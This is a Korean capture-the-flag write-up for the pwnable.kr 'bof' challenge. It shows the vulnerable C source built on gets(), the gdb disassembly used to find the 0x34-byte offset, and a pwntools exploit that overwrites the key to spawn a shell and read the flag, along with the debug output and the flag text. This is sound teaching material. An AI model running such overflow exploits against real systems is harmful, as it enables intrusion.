# bof

## bof.c

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

위 코드는 `gets()`로 `overflowme[32]`에 문자열을 받는다. `func`의 인수인 `key`의 주소를 찾기위해 gdb로 `bof`를 열어보았다.

```asm
   0x0000062c <+0>:	push   ebp
   0x0000062d <+1>:	mov    ebp,esp
   0x0000062f <+3>:	sub    esp,0x48
   0x00000632 <+6>:	mov    eax,gs:0x14
   0x00000638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x0000063b <+15>:	xor    eax,eax
   0x0000063d <+17>:	mov    DWORD PTR [esp],0x78c
   0x00000644 <+24>:	call   0x645 <func+25>
   0x00000649 <+29>:	lea    eax,[ebp-0x2c]
   0x0000064c <+32>:	mov    DWORD PTR [esp],eax
   0x0000064f <+35>:	call   0x650 <func+36>
   0x00000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x0000065b <+47>:	jne    0x66b <func+63>
   0x0000065d <+49>:	mov    DWORD PTR [esp],0x79b
   0x00000664 <+56>:	call   0x665 <func+57>
   0x00000669 <+61>:	jmp    0x677 <func+75>
   0x0000066b <+63>:	mov    DWORD PTR [esp],0x7a3
   0x00000672 <+70>:	call   0x673 <func+71>
   0x00000677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0000067a <+78>:	xor    eax,DWORD PTR gs:0x14
   0x00000681 <+85>:	je     0x688 <func+92>
   0x00000683 <+87>:	call   0x684 <func+88>
   0x00000688 <+92>:	leave  
   0x00000689 <+93>:	ret    
```

`overflowme`는 `[ebp-0x2c]` 에 존재하고 `key`는 `[ebp+0x8]`에 존재한다. `0x34`만큼 차이가 난다.
그 뒤로 리틀엔디안으로 `0xcafebabe` 값을 넣어주면 된다.

## exploit.py

```python
from pwn import *

context.log_level = 'debug'

r = remote('pwnable.kr', 9000)

payload = 'a' * (4 * 13)  +  p32(0xcafebabe)

r.sendline(payload)

sleep(1)

r.sendline('cat flag')

r.recv()
```

```bash
[+] Opening connection to pwnable.kr on port 9000: Done
[DEBUG] Sent 0x39 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000030  61 61 61 61  be ba fe ca  0a                        │aaaa│····│·│
    00000039
[DEBUG] Sent 0x9 bytes:
    'cat flag\n'
[DEBUG] Received 0x20 bytes:
    'daddy, I just pwned a buFFer :)\n'
[*] Closed connection to pwnable.kr port 9000
```